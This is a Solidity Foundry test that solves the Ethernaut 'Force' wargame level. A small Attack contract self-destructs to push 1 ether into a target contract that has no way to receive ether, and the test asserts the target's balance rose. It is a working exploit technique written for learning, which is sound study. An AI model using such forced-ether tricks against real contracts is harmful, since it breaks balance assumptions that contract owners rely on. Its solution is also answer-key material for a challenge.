// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_7/Force.sol";

contract Attack {
    address victim;

    constructor(address _victim) {
        victim = _victim;
    }

    // selfdestruct destroys this contract and sends ether to the target address
    // selfdestruct should be used with access control ie. onlyOwner
    function attack() public {
        selfdestruct(payable(victim));
    }
}

contract ForceTest is Test {
    Force public force;
    Attack public attack;

    function setUp() public {
        force = new Force();
        attack = new Attack(address(force));
    }

    function testAttack() public {
        // set attack contract balance to 1 ether
        vm.deal(address(attack), 1 ether);

        // selfdestruct attack contract
        attack.attack();

        // balance of force contract
        uint256 forceBalance = address(force).balance;
        assertGt(forceBalance, 0);
    }
}
